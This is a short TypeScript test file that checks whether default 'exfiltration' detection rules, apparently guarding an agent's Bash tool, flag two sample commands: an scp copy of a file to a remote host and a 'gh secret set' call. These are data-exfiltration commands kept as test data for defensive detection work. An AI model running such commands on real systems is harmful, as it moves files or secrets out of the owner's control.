import { describe, it } from "node:test";
import { strict as assert } from "node:assert";
import { exfiltrationRules } from "../../src/defaults/exfiltration.js";
import { evaluateRule } from "../../src/mapping.js";

const bashMatches = (input: string) =>
  exfiltrationRules.some((r) => r.tool === "Bash" && evaluateRule(r, "Bash", input));

describe("defaults: exfiltration (skeletal)", () => {
  it("matches scp to remote (representative)", () => {
    assert.ok(bashMatches("scp file.txt user@host:/tmp/"));
  });
  it("matches gh secret set (representative)", () => {
    assert.ok(bashMatches("gh secret set MY_TOKEN"));
  });
});
